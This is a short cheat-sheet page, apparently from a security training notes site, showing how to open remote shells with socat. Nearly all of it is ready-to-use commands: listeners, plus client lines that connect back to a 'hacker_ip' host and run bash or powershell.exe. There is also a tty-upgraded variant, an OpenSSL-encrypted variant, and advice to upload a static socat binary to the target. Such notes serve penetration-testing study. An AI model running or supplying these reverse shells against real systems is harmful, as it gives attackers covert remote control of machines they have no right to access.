# socat

[![introtoshells](../../../_badges/thmp/introtoshells.svg)](https://tryhackme.com/room/introtoshells)

[Go back](../index.md#remote-shell-)

<div class="row row-cols-md-2"><div>

socat is a command similar to netcat. Similarely to other wrappers, it can be used for a client or a server, but with socat, you will mostly use a wrapper for both sides.
</div><div>

ðŸ”¥ On the target, you can upload a [static binary of socat](https://github.com/andrew-d/static-binaries/tree/master/binaries) as the command/executable is most likely not present.
</div></div>

<hr class="sep-both">

## TCP shell - stdin

<div class="row row-cols-md-2 mt-3"><div>

*Linux server*

```shell!
$ socat TCP-L:port -
```
</div><div>

*Linux/Windows Client*

```ps
$ socat TCP:hacker_ip:port EXEC:"bash -li"
PS> socat TCP:hacker_ip:port EXEC:powershell.exe,pipes
```
</div></div>

<hr class="sep-both">

## TCP shell - tty

<div class="row row-cols-md-2 mt-3"><div>

*Linux server*

```shell!
$ socat TCP-L:port FILE:`tty`,raw,echo=0
```
</div><div>

*Linux client*

```ps
$ socat TCP:hacker_ip:port EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
</div></div>

<hr class="sep-both">

## Encrypted shell ðŸ”¥

<div class="row row-cols-md-2 mt-3"><div>

You first need to generate a certificate:

```ps
$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
$ cat shell.key shell.crt > shell.pem
```
</div><div>

*Linux server*

```shell!
$ socat OPENSSL-LISTEN:port,cert=shell.pem,verify=0 [...]
```

*Linux client*

```ps
$ socat OPENSSL:hacker_ip:port,verify=0 [...]
```
</div></div>